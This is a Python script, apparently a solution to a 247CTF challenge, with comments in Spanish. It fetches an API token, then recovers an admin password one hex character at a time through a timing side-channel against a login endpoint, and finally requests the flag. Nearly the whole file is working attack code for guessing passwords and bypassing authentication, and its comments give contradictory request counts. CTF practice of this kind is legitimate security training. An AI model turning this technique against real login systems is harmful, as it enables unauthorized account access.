#!/usr/bin/env python3
import requests
import time
import statistics

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    token = data["message"].split("reset to ")[1].rstrip("!")
    return token

def try_password(username, password, api_token):
    start = time.time()
    resp = requests.post(
        f"{BASE_URL}/api/login",
        data={
            "username": username,
            "password": password,
            "api": api_token
        },
        timeout=10
    )
    elapsed = time.time() - start
    return resp.json(), elapsed

def get_flag(password):
    resp = requests.post(
        f"{BASE_URL}/api/get_flag",
        data={"password": password},
        timeout=10
    )
    return resp.json()

# Obtener token y hacer ataque carácter por carácter
# Con 128 requests y 32 posiciones, tengo 4 requests por posición
# Voy a hacer 1 medición por carácter (16 requests por posición)
# Eso me da para ~8 posiciones por token

known = ""

for round_num in range(4):  # 4 rondas para 32 caracteres
    api_token = get_token()
    request_count = 0
    
    positions_in_round = 8  # 8 posiciones por ronda, 16 requests cada una
    
    for pos_in_round in range(positions_in_round):
        timings = {}
        
        for char in HEX_CHARS:
            if request_count >= 120:
                break
                
            test_password = known + char + "0" * (31 - len(known))
            result, elapsed = try_password("admin", test_password, api_token)
            timings[char] = elapsed
            request_count += 1
            
            # Si tenemos éxito, obtener la flag
            if result.get("result") == "success":
                print(f"LOGIN SUCCESS: {test_password}")
                flag_result = get_flag(test_password)
                if "247CTF" in str(flag_result):
                    print(flag_result['flag'])
                    exit(0)
        
        if timings:
            # Elegir el carácter con mayor tiempo
            best_char = max(timings.items(), key=lambda x: x[1])[0]
            known += best_char

# Intentar con la contraseña final
print(f"Final password attempt: {known}")
flag_result = get_flag(known)
if "flag" in flag_result:
    print(flag_result["flag"])
else:
    print(f"No flag found. Result: {flag_result}")
